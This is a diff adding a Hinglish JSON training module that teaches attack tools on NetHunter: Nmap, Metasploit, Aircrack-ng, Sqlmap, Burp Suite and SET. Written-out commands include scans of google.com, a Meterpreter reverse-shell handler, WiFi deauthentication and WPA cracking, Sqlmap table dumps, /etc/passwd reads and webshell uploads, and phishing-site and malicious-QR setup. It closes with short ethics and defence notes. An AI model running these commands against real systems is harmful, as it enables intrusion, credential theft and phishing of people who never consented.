@@ -1,0 +1,684 @@
+{
+  "moduleTitle": "Module 4: NetHunter Tools",
+  "moduleDescription": "Professional penetration testing tools ki detailed usage - Nmap, Metasploit, Aircrack-ng, Sqlmap aur Burp Suite",
+  "lessons": [
+    {
+      "id": 1,
+      "title": "Nmap - Network Discovery Master",
+      "content": {
+        "intro": "Nmap (Network Mapper) - network discovery aur security auditing ka king. Har ethical hacker ka favorite tool.",
+        "sections": [
+          {
+            "heading": "Basic Nmap Scans",
+            "commands": [
+              {
+                "description": "Simple Host Discovery",
+                "command": "nmap google.com",
+                "explanation": "Target host ke open ports scan karta hai"
+              },
+              {
+                "description": "Network Range Scan",
+                "command": "nmap 192.168.1.0/24",
+                "explanation": "Pura network range scan karta hai"
+              },
+              {
+                "description": "Ping Scan Only",
+                "command": "nmap -sn 192.168.1.0/24",
+                "explanation": "Sirf live hosts find karta hai, ports scan nahi karta"
+              }
+            ]
+          },
+          {
+            "heading": "Advanced Scan Types",
+            "commands": [
+              {
+                "description": "TCP SYN Scan",
+                "command": "nmap -sS google.com",
+                "explanation": "Stealth scan - half-open connections use karta hai"
+              },
+              {
+                "description": "UDP Scan",
+                "command": "nmap -sU google.com",
+                "explanation": "UDP ports scan karta hai (slow but important)"
+              },
+              {
+                "description": "Comprehensive Scan",
+                "command": "nmap -sS -sV -O google.com",
+                "explanation": "Service version aur OS detection ke saath scan"
+              }
+            ]
+          },
+          {
+            "heading": "Service & Version Detection",
+            "commands": [
+              {
+                "description": "Service Version Scan",
+                "command": "nmap -sV google.com",
+                "explanation": "Running services ke versions detect karta hai"
+              },
+              {
+                "description": "OS Detection",
+                "command": "nmap -O google.com",
+                "explanation": "Target system ka operating system guess karta hai"
+              },
+              {
+                "description": "Aggressive Scan",
+                "command": "nmap -A google.com",
+                "explanation": "OS, version, script scanning - sab kuch ek saath"
+              }
+            ]
+          },
+          {
+            "heading": "NSE Scripts Usage",
+            "commands": [
+              {
+                "description": "Default Scripts",
+                "command": "nmap -sC google.com",
+                "explanation": "Default NSE scripts run karta hai"
+              },
+              {
+                "description": "Vulnerability Scripts",
+                "command": "nmap --script vuln google.com",
+                "explanation": "Known vulnerabilities check karta hai"
+              },
+              {
+                "description": "HTTP Scripts",
+                "command": "nmap --script http-* google.com",
+                "explanation": "HTTP related scripts run karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Output & Timing",
+            "commands": [
+              {
+                "description": "Save Results",
+                "command": "nmap -oN scan_results.txt google.com",
+                "explanation": "Scan results text file mein save karta hai"
+              },
+              {
+                "description": "Fast Scan",
+                "command": "nmap -T4 google.com",
+                "explanation": "Fast timing template use karta hai"
+              },
+              {
+                "description": "Stealth Scan",
+                "command": "nmap -T1 google.com",
+                "explanation": "Slow aur stealthy scan karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 2,
+      "title": "Metasploit Framework Deep Dive",
+      "content": {
+        "intro": "Metasploit - penetration testing ka Swiss Army knife. Exploits, payloads, aur post-exploitation modules ka complete framework.",
+        "sections": [
+          {
+            "heading": "Metasploit Console Basics",
+            "commands": [
+              {
+                "description": "Start Metasploit",
+                "command": "msfconsole",
+                "explanation": "Metasploit console launch karta hai"
+              },
+              {
+                "description": "Search Exploits",
+                "command": "search type:exploit platform:windows",
+                "explanation": "Windows exploits search karta hai"
+              },
+              {
+                "description": "Show Info",
+                "command": "info exploit/windows/smb/ms17_010_eternalblue",
+                "explanation": "Specific exploit ki details dikhata hai"
+              }
+            ]
+          },
+          {
+            "heading": "Exploit Usage Workflow",
+            "commands": [
+              {
+                "description": "Use Exploit",
+                "command": "use exploit/multi/handler",
+                "explanation": "Generic payload handler select karta hai"
+              },
+              {
+                "description": "Show Options",
+                "command": "show options",
+                "explanation": "Current module ke options dikhata hai"
+              },
+              {
+                "description": "Set Payload",
+                "command": "set payload windows/meterpreter/reverse_tcp",
+                "explanation": "Reverse TCP meterpreter payload set karta hai"
+              },
+              {
+                "description": "Set LHOST",
+                "command": "set LHOST 192.168.1.100",
+                "explanation": "Local host IP address set karta hai"
+              },
+              {
+                "description": "Set LPORT",
+                "command": "set LPORT 4444",
+                "explanation": "Listening port set karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Auxiliary Modules",
+            "commands": [
+              {
+                "description": "Port Scanner",
+                "command": "use auxiliary/scanner/portscan/tcp",
+                "explanation": "TCP port scanner module use karta hai"
+              },
+              {
+                "description": "SMB Scanner",
+                "command": "use auxiliary/scanner/smb/smb_version",
+                "explanation": "SMB service version scanner"
+              },
+              {
+                "description": "HTTP Directory Scanner",
+                "command": "use auxiliary/scanner/http/dir_scanner",
+                "explanation": "Web directory brute force scanner"
+              }
+            ]
+          },
+          {
+            "heading": "Meterpreter Commands",
+            "text": "Meterpreter session mil jane ke baad ye commands use kar sakte hain:",
+            "commands": [
+              {
+                "description": "System Info",
+                "command": "sysinfo",
+                "explanation": "Target system information dikhata hai"
+              },
+              {
+                "description": "Get User",
+                "command": "getuid",
+                "explanation": "Current user privileges check karta hai"
+              },
+              {
+                "description": "Screenshot",
+                "command": "screenshot",
+                "explanation": "Target system ka screenshot leta hai"
+              },
+              {
+                "description": "File Download",
+                "command": "download C:\\\\important.txt",
+                "explanation": "Target se file download karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Database Commands",
+            "commands": [
+              {
+                "description": "Database Status",
+                "command": "db_status",
+                "explanation": "Database connection status check karta hai"
+              },
+              {
+                "description": "Workspace Create",
+                "command": "workspace -a project1",
+                "explanation": "Naya workspace banata hai"
+              },
+              {
+                "description": "Import Nmap",
+                "command": "db_import nmap_scan.xml",
+                "explanation": "Nmap results database mein import karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 3,
+      "title": "Aircrack-ng WiFi Security Testing",
+      "content": {
+        "intro": "Aircrack-ng suite - WiFi security assessment ka complete toolkit. WEP, WPA, WPA2 networks test karne ke liye.",
+        "sections": [
+          {
+            "heading": "Monitor Mode Setup",
+            "text": "⚠️ Note: Mobile mein external WiFi adapter zaroori hai monitor mode ke liye",
+            "commands": [
+              {
+                "description": "Interface Check",
+                "command": "iwconfig",
+                "explanation": "Available wireless interfaces dikhata hai"
+              },
+              {
+                "description": "Monitor Mode Enable",
+                "command": "airmon-ng start wlan0",
+                "explanation": "WiFi interface ko monitor mode mein switch karta hai"
+              },
+              {
+                "description": "Monitor Check",
+                "command": "airmon-ng",
+                "explanation": "Monitor mode interfaces list karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Network Discovery",
+            "commands": [
+              {
+                "description": "Scan Networks",
+                "command": "airodump-ng wlan0mon",
+                "explanation": "Nearby WiFi networks scan karta hai"
+              },
+              {
+                "description": "Target Specific Network",
+                "command": "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
+                "explanation": "Specific network ko target kar ke capture karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "WPA/WPA2 Handshake Capture",
+            "commands": [
+              {
+                "description": "Deauth Attack",
+                "command": "aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon",
+                "explanation": "Clients ko disconnect kar ke handshake force karta hai"
+              },
+              {
+                "description": "Targeted Deauth",
+                "command": "aireplay-ng -0 3 -a 00:11:22:33:44:55 -c 11:22:33:44:55:66 wlan0mon",
+                "explanation": "Specific client ko target kar ke deauth karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Password Cracking",
+            "commands": [
+              {
+                "description": "WPA Crack with Wordlist",
+                "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap",
+                "explanation": "Captured handshake ko wordlist se crack karta hai"
+              },
+              {
+                "description": "WEP Crack",
+                "command": "aircrack-ng -b 00:11:22:33:44:55 wep_capture-*.cap",
+                "explanation": "WEP encrypted network crack karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Advanced Techniques",
+            "commands": [
+              {
+                "description": "Custom Wordlist",
+                "command": "crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 > custom.txt",
+                "explanation": "Custom wordlist generate karta hai"
+              },
+              {
+                "description": "Hashcat Conversion",
+                "command": "aircrack-ng -J hashcat_format capture-01.cap",
+                "explanation": "Hashcat format mein convert karta hai"
+              },
+              {
+                "description": "WPS Attack",
+                "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv",
+                "explanation": "WPS enabled router attack karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Cleanup & Restore",
+            "commands": [
+              {
+                "description": "Stop Monitor Mode",
+                "command": "airmon-ng stop wlan0mon",
+                "explanation": "Monitor mode disable kar ke normal mode restore karta hai"
+              },
+              {
+                "description": "Restart Network",
+                "command": "systemctl restart NetworkManager",
+                "explanation": "Network manager restart karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 4,
+      "title": "Sqlmap - Database Security Testing",
+      "content": {
+        "intro": "Sqlmap - SQL injection vulnerabilities detect aur exploit karne ka automatic tool. Database security testing ka standard.",
+        "sections": [
+          {
+            "heading": "Basic SQL Injection Testing",
+            "commands": [
+              {
+                "description": "Simple URL Test",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1'",
+                "explanation": "URL parameter mein SQL injection test karta hai"
+              },
+              {
+                "description": "Database Enumeration",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --dbs",
+                "explanation": "Available databases list karta hai"
+              },
+              {
+                "description": "Tables Enumeration",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' -D acuart --tables",
+                "explanation": "Specific database ke tables list karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Advanced Enumeration",
+            "commands": [
+              {
+                "description": "Columns Dump",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users --columns",
+                "explanation": "Table ke columns dikhata hai"
+              },
+              {
+                "description": "Data Dump",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' -D acuart -T users --dump",
+                "explanation": "Table ka complete data dump karta hai"
+              },
+              {
+                "description": "Current User",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --current-user",
+                "explanation": "Database current user dikhata hai"
+              }
+            ]
+          },
+          {
+            "heading": "POST Request Testing",
+            "commands": [
+              {
+                "description": "POST Data Test",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/search.php' --data='searchFor=1'",
+                "explanation": "POST parameters mein SQL injection test karta hai"
+              },
+              {
+                "description": "Cookie Testing",
+                "command": "sqlmap -u 'http://example.com' --cookie='id=1' --level=2",
+                "explanation": "Cookie parameters test karta hai"
+              },
+              {
+                "description": "Header Testing",
+                "command": "sqlmap -u 'http://example.com' --headers='X-Forwarded-For: 1*' --level=3",
+                "explanation": "HTTP headers mein injection test karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "File System Operations",
+            "commands": [
+              {
+                "description": "File Read",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --file-read='/etc/passwd'",
+                "explanation": "Server se file read karta hai"
+              },
+              {
+                "description": "File Write",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php'",
+                "explanation": "Server pe file upload karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "OS Command Execution",
+            "commands": [
+              {
+                "description": "OS Shell",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --os-shell",
+                "explanation": "Operating system shell access try karta hai"
+              },
+              {
+                "description": "OS Command",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --os-cmd='whoami'",
+                "explanation": "Single OS command execute karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Advanced Options",
+            "commands": [
+              {
+                "description": "Tamper Scripts",
+                "command": "sqlmap -u 'http://example.com?id=1' --tamper=space2comment",
+                "explanation": "WAF bypass ke liye tamper scripts use karta hai"
+              },
+              {
+                "description": "Risk & Level",
+                "command": "sqlmap -u 'http://example.com?id=1' --risk=3 --level=5",
+                "explanation": "High risk aur level ke saath comprehensive test"
+              },
+              {
+                "description": "Batch Mode",
+                "command": "sqlmap -u 'http://example.com?id=1' --batch",
+                "explanation": "Automatic mode - user input nahi mangta"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 5,
+      "title": "Burp Suite Mobile Setup",
+      "content": {
+        "intro": "Burp Suite - web application security testing ka industry standard. Mobile pe proxy setup aur basic usage.",
+        "sections": [
+          {
+            "heading": "Burp Suite Installation",
+            "commands": [
+              {
+                "description": "Java Install",
+                "command": "apt install default-jdk -y",
+                "explanation": "Java runtime environment install karta hai"
+              },
+              {
+                "description": "Burp Download",
+                "command": "wget 'https://portswigger.net/burp/releases/download?product=community&type=jar' -O burpsuite.jar",
+                "explanation": "Burp Suite Community Edition download karta hai"
+              },
+              {
+                "description": "Burp Start",
+                "command": "java -jar burpsuite.jar",
+                "explanation": "Burp Suite launch karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Proxy Configuration",
+            "text": "Burp Suite proxy setup karne ke steps:",
+            "commands": [
+              {
+                "description": "Check IP Address",
+                "command": "ip addr show",
+                "explanation": "System ka IP address check karta hai"
+              },
+              {
+                "description": "Netstat Check",
+                "command": "netstat -tlnp | grep 8080",
+                "explanation": "Port 8080 pe Burp proxy running hai ya nahi check karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Certificate Setup",
+            "text": "HTTPS traffic intercept karne ke liye certificate setup:",
+            "commands": [
+              {
+                "description": "Certificate Download",
+                "command": "curl -k http://127.0.0.1:8080/cert -o burp_cert.der",
+                "explanation": "Burp CA certificate download karta hai"
+              },
+              {
+                "description": "Convert to PEM",
+                "command": "openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem",
+                "explanation": "Certificate ko PEM format mein convert karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Mobile Browser Configuration",
+            "text": "Mobile browser mein proxy settings:\\n\\n1. Browser settings mein jaye\\n2. Network/Proxy settings find kare\\n3. Manual proxy setup kare:\\n   - Proxy: [Your NetHunter IP]\\n   - Port: 8080\\n4. Certificate install kare security settings se"
+          },
+          {
+            "heading": "Basic Burp Usage",
+            "text": "Burp Suite ke main features:",
+            "commands": [
+              {
+                "description": "Target Scope Set",
+                "command": "# Burp GUI mein Target tab > Scope mein domain add kare",
+                "explanation": "Testing scope define karta hai"
+              },
+              {
+                "description": "Intercept Toggle",
+                "command": "# Proxy tab > Intercept mein 'Intercept is on/off' button",
+                "explanation": "Request interception on/off karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Common Testing Scenarios",
+            "text": "Burp Suite se ye tests kar sakte hain:\\n\\n• HTTP request/response analysis\\n• Parameter tampering\\n• Session token analysis\\n• SQL injection testing\\n• XSS vulnerability testing\\n• Authentication bypass\\n• Authorization testing"
+          },
+          {
+            "heading": "Alternative Mobile Tools",
+            "commands": [
+              {
+                "description": "OWASP ZAP Install",
+                "command": "apt install zaproxy -y",
+                "explanation": "Free alternative to Burp Suite"
+              },
+              {
+                "description": "ZAP Start",
+                "command": "zaproxy",
+                "explanation": "OWASP ZAP launch karta hai"
+              },
+              {
+                "description": "Mitmproxy Install",
+                "command": "pip3 install mitmproxy",
+                "explanation": "Command line HTTP proxy tool"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 6,
+      "title": "Social Engineering Toolkit (SET)",
+      "content": {
+        "intro": "Social Engineering Toolkit - human psychology exploit karne ka powerful framework. Phishing, credential harvesting aur social engineering attacks.",
+        "sections": [
+          {
+            "heading": "SET Installation & Setup",
+            "commands": [
+              {
+                "description": "SET Install",
+                "command": "apt install set -y",
+                "explanation": "Social Engineering Toolkit install karta hai"
+              },
+              {
+                "description": "SET Launch",
+                "command": "setoolkit",
+                "explanation": "SET main menu launch karta hai"
+              },
+              {
+                "description": "Update SET",
+                "command": "cd /opt/setoolkit && git pull",
+                "explanation": "SET ko latest version mein update karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Website Attack Vectors",
+            "text": "SET Menu Navigation:\\n1. Social-Engineering Attacks\\n2. Website Attack Vectors\\n3. Credential Harvester Attack Method",
+            "commands": [
+              {
+                "description": "Apache Start",
+                "command": "systemctl start apache2",
+                "explanation": "Web server start karta hai phishing site ke liye"
+              },
+              {
+                "description": "Check Apache Status",
+                "command": "systemctl status apache2",
+                "explanation": "Apache service status check karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Email Phishing Attacks",
+            "text": "SET se email phishing campaign:\\n\\n1. Spear-Phishing Attack Vectors\\n2. Create a FileFormat Payload\\n3. Select target (PDF, Word, etc.)\\n4. Generate malicious file",
+            "commands": [
+              {
+                "description": "Sendmail Install",
+                "command": "apt install sendmail -y",
+                "explanation": "Email sending service install karta hai"
+              },
+              {
+                "description": "Mail Configuration",
+                "command": "nano /etc/mail/sendmail.cf",
+                "explanation": "Sendmail configuration edit karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "USB/Physical Attacks",
+            "commands": [
+              {
+                "description": "Teensy Attack",
+                "command": "# SET Menu: 3) Create a Payload and Listener > 2) Windows Reverse_TCP Meterpreter",
+                "explanation": "USB-based payload generation"
+              },
+              {
+                "description": "Arduino Attack",
+                "command": "# SET Menu: 1) Social-Engineering Attacks > 7) Teensy USB HID Attack Vector",
+                "explanation": "Arduino-based HID attack"
+              }
+            ]
+          },
+          {
+            "heading": "Wireless Access Point Attack",
+            "commands": [
+              {
+                "description": "Hostapd Install",
+                "command": "apt install hostapd dnsmasq -y",
+                "explanation": "Fake access point banane ke liye tools"
+              },
+              {
+                "description": "Evil Twin Setup",
+                "command": "# SET Menu: 1) Social-Engineering Attacks > 7) Wireless Access Point Attack",
+                "explanation": "Fake WiFi hotspot create karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "SMS Spoofing & QR Code",
+            "commands": [
+              {
+                "description": "QR Code Generator",
+                "command": "apt install qrencode -y",
+                "explanation": "QR code generation tool install karta hai"
+              },
+              {
+                "description": "Generate QR Code",
+                "command": "qrencode -o malicious.png 'http://your-phishing-site.com'",
+                "explanation": "Malicious URL ka QR code banata hai"
+              }
+            ]
+          },
+          {
+            "heading": "Defense & Awareness",
+            "text": "⚠️ Ethical Usage Guidelines:\\n\\n• Sirf authorized penetration testing mein use kare\\n• Client ki written permission zaroori hai\\n• Educational purpose ke liye awareness create kare\\n• Illegal activities ke liye kabhi use na kare\\n\\n🛡️ Defense Tips:\\n• Employee security training\\n• Email filtering solutions\\n• Multi-factor authentication\\n• Regular security awareness programs\\n• Incident response procedures"
+          }
+        ]
+      }
+    }
+  ]
+}
